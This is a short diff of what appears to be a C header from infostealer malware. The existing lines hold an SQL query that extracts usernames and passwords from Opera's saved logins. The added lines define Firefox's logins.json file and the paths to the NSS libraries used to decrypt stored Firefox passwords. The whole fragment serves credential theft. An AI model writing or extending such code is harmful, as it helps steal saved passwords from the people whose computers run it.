@@ -49,3 +49,8 @@
 #define OPERA_CONFIG_FILE L"Local State"
 #define OPERA_FOLDER L"\\Opera Software\\Opera Stable"
 #define OPERA_SQL_QUERY "SELECT action_url, username_value, password_value FROM logins"
+
+#define FIREFOX_FILE_TWO L"logins.json"
+#define FIREFOX_FOLDER L"\\Mozilla\\Firefox\\Profiles"
+#define FIREFOX_DLL_NSS3 L"C:\\Program Files\\Mozilla Firefox\\nss3.dll"
+#define FIREFOX_DLL_MOZGLUE L"C:\\Program Files\\Mozilla Firefox\\mozglue.dll"
